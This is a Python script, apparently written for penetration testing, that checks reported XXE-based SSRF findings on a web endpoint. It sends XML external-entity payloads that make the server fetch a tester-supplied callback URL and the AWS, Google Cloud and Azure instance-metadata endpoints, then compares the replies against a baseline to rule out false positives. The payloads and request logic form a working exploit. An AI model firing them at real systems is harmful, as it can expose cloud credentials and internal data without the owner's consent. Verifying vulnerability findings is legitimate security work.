#!/usr/bin/env python3
"""
Manual XXE SSRF Verification Script

This script helps manually verify XXE-based SSRF findings by:
1. Testing if endpoints actually process XML
2. Using an external callback server to confirm SSRF
3. Comparing baseline vs attack responses
4. Checking for actual cloud metadata exposure
"""

import requests
import sys
import re
from urllib.parse import urljoin
from typing import Dict, List, Tuple

class XXEVerifier:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def get_baseline(self, endpoint: str) -> Tuple[requests.Response, str]:
        """Get baseline response without XXE payload."""
        try:
            url = urljoin(self.base_url, endpoint)
            # Try GET first
            response = self.session.get(url, timeout=10)
            baseline_content = response.text.lower()
            return response, baseline_content
        except Exception as e:
            print(f"  ❌ Baseline GET failed: {e}")
            return None, ""
    
    def test_endpoint_exists(self, endpoint: str) -> bool:
        """Check if endpoint exists and what it returns normally."""
        print(f"\n[1] Testing if {endpoint} exists and accepts requests...")
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Try GET
            response = self.session.get(url, timeout=10)
            print(f"  GET {endpoint}: HTTP {response.status_code}")
            print(f"  Content-Type: {response.headers.get('Content-Type', 'unknown')}")
            
            # Try POST with plain text
            response_post = self.session.post(url, data="test", timeout=10)
            print(f"  POST {endpoint}: HTTP {response_post.status_code}")
            
            # Check if it accepts XML
            response_xml = self.session.post(
                url,
                data='<?xml version="1.0"?><test>hello</test>',
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            print(f"  POST XML: HTTP {response_xml.status_code}")
            
            # Check for XML processing indicators
            content_type = response_xml.headers.get('Content-Type', '').lower()
            if 'xml' in content_type or 'xml' in response_xml.text[:200].lower():
                print(f"  ✓ Endpoint appears to process XML")
                return True
            else:
                print(f"  ⚠ Endpoint may not process XML")
                return False
                
        except Exception as e:
            print(f"  ❌ Error: {e}")
            return False
    
    def check_keywords_in_baseline(self, endpoint: str) -> Dict[str, bool]:
        """Check if false positive keywords exist in baseline response."""
        print(f"\n[2] Checking for false positive keywords in baseline response...")
        
        response, baseline = self.get_baseline(endpoint)
        if not response:
            return {}
        
        keywords = ['instance-id', 'public-ipv4', 'metadata', 'aws', 'amazon']
        found = {}
        
        for keyword in keywords:
            if keyword in baseline:
                count = baseline.count(keyword)
                print(f"  ⚠ WARNING: '{keyword}' found {count} times in baseline response!")
                print(f"     This suggests a FALSE POSITIVE - word exists in normal page content")
                found[keyword] = True
                
                # Show context
                pattern = re.compile(rf'.{{0,50}}{re.escape(keyword)}.{{0,50}}', re.IGNORECASE)
                matches = pattern.findall(response.text)
                if matches:
                    print(f"     Context: ...{matches[0][:100]}...")
            else:
                print(f"  ✓ '{keyword}' not in baseline")
                found[keyword] = False
        
        return found
    
    def test_with_external_callback(self, endpoint: str, callback_url: str) -> bool:
        """Test XXE with external callback server to confirm SSRF."""
        print(f"\n[3] Testing XXE with external callback server: {callback_url}")
        print(f"    (You need to set up a listener at {callback_url} to receive callbacks)")
        
        xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "{callback_url}">
]>
<test>&xxe;</test>'''
        
        try:
            url = urljoin(self.base_url, endpoint)
            response = self.session.post(
                url,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=10
            )
            
            print(f"  Request sent. Check your callback server for incoming requests.")
            print(f"  Response status: {response.status_code}")
            print(f"  Response length: {len(response.text)} bytes")
            
            # If callback was received, you'll see it in your server logs
            return response.status_code in [200, 400, 500]
            
        except Exception as e:
            print(f"  ❌ Error: {e}")
            return False
    
    def test_cloud_metadata_ssrf(self, endpoint: str) -> Dict[str, any]:
        """Test XXE SSRF against cloud metadata endpoints."""
        print(f"\n[4] Testing XXE SSRF against cloud metadata endpoints...")
        
        # Get baseline first
        baseline_response, baseline_content = self.get_baseline(endpoint)
        
        # Cloud metadata endpoints
        metadata_targets = {
            'AWS': 'http://169.254.169.254/latest/meta-data/',
            'Google Cloud': 'http://metadata.google.internal/computeMetadata/v1/',
            'Azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        }
        
        results = {}
        
        for cloud, target_url in metadata_targets.items():
            print(f"\n  Testing {cloud} metadata endpoint: {target_url}")
            
            xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "{target_url}">
]>
<test>&xxe;</test>'''
            
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.post(
                    url,
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=10
                )
                
                content = response.text.lower()
                
                print(f"    Status: {response.status_code}")
                print(f"    Response length: {len(response.text)} bytes")
                
                # Check for metadata indicators
                indicators = {
                    'instance-id': 'instance-id' in content and 'instance-id' not in baseline_content,
                    'public-ipv4': 'public-ipv4' in content and 'public-ipv4' not in baseline_content,
                    'metadata': 'metadata' in content and 'metadata' not in baseline_content,
                    'ami-id': 'ami-id' in content,
                    'local-ipv4': 'local-ipv4' in content,
                }
                
                # More specific AWS metadata checks
                aws_specific = [
                    'ami-id',
                    'hostname',
                    'local-hostname',
                    'public-hostname',
                    'public-ipv4',
                    'local-ipv4',
                    'instance-type',
                    'instance-id',
                ]
                
                found_aws_indicators = [ind for ind in aws_specific if ind in content]
                
                results[cloud] = {
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'indicators_found': indicators,
                    'aws_indicators': found_aws_indicators,
                    'response_preview': response.text[:500] if response.text else "",
                }
                
                # Status code 429 = rate limiting, not vulnerability
                if response.status_code == 429:
                    print(f"    ⚠ Status 429 = Rate limiting detected, NOT a vulnerability")
                    print(f"       This is a FALSE POSITIVE")
                
                # Check if indicators are new (not in baseline)
                new_indicators = [k for k, v in indicators.items() if v]
                if new_indicators:
                    print(f"    ⚠ New indicators found: {new_indicators}")
                    print(f"    Response preview: {response.text[:300]}")
                else:
                    print(f"    ✓ No new indicators found (may be false positive)")
                
            except Exception as e:
                print(f"    ❌ Error: {e}")
                results[cloud] = {'error': str(e)}
        
        return results
    
    def verify_xxe_ssrf(self, endpoint: str = '/upload') -> Dict[str, any]:
        """Complete verification process."""
        print(f"\n{'='*60}")
        print(f"Manual XXE SSRF Verification for {self.base_url}{endpoint}")
        print(f"{'='*60}")
        
        results = {
            'endpoint_exists': False,
            'processes_xml': False,
            'baseline_keywords': {},
            'cloud_metadata_test': {},
            'verification_status': 'UNKNOWN',
            'confidence': 'LOW',
        }
        
        # Step 1: Check if endpoint exists
        results['endpoint_exists'] = self.test_endpoint_exists(endpoint)
        if not results['endpoint_exists']:
            print(f"\n❌ VERIFICATION RESULT: FALSE POSITIVE")
            print(f"   Reason: Endpoint doesn't exist or doesn't process requests properly")
            results['verification_status'] = 'FALSE_POSITIVE'
            results['confidence'] = 'HIGH'
            return results
        
        # Step 2: Check baseline for false positive keywords
        results['baseline_keywords'] = self.check_keywords_in_baseline(endpoint)
        if any(results['baseline_keywords'].values()):
            print(f"\n❌ VERIFICATION RESULT: LIKELY FALSE POSITIVE")
            print(f"   Reason: Keywords found in baseline response (not from XXE)")
            results['verification_status'] = 'LIKELY_FALSE_POSITIVE'
            results['confidence'] = 'MEDIUM'
        
        # Step 3: Test cloud metadata SSRF
        results['cloud_metadata_test'] = self.test_cloud_metadata_ssrf(endpoint)
        
        # Analyze results
        print(f"\n{'='*60}")
        print(f"VERIFICATION SUMMARY")
        print(f"{'='*60}")
        
        # Check if we got rate limited (429)
        has_429 = any(
            r.get('status_code') == 429 
            for r in results['cloud_metadata_test'].values()
        )
        
        if has_429:
            print(f"\n❌ VERIFICATION RESULT: FALSE POSITIVE")
            print(f"   Reason: HTTP 429 (Too Many Requests) indicates rate limiting, not vulnerability")
            results['verification_status'] = 'FALSE_POSITIVE'
            results['confidence'] = 'HIGH'
        
        # Check if we found actual metadata
        elif any(
            len(r.get('aws_indicators', [])) > 2
            for r in results['cloud_metadata_test'].values()
        ):
            print(f"\n⚠️  VERIFICATION RESULT: POSSIBLY VALID")
            print(f"   Reason: Multiple AWS metadata indicators found")
            print(f"   ⚠️  REQUIRES FURTHER INVESTIGATION")
            results['verification_status'] = 'POSSIBLY_VALID'
            results['confidence'] = 'MEDIUM'
        else:
            print(f"\n❌ VERIFICATION RESULT: FALSE POSITIVE")
            print(f"   Reason: No strong evidence of successful XXE SSRF")
            results['verification_status'] = 'FALSE_POSITIVE'
            results['confidence'] = 'MEDIUM'
        
        return results


def main():
    if len(sys.argv) < 2:
        print("Usage: python manual_xxe_verification.py <url> [endpoint]")
        print("Example: python manual_xxe_verification.py http://example.com /upload")
        sys.exit(1)
    
    base_url = sys.argv[1]
    endpoint = sys.argv[2] if len(sys.argv) > 2 else '/upload'
    
    verifier = XXEVerifier(base_url)
    results = verifier.verify_xxe_ssrf(endpoint)
    
    print(f"\n{'='*60}")
    print(f"For definitive proof, set up an external callback server:")
    print(f"  1. Use webhook.site or requestbin.net")
    print(f"  2. Get your callback URL")
    print(f"  3. Run: verifier.test_with_external_callback('{endpoint}', 'YOUR_CALLBACK_URL')")
    print(f"  4. If your callback receives the request, XXE is confirmed")
    print(f"{'='*60}")


if __name__ == '__main__':
    main()

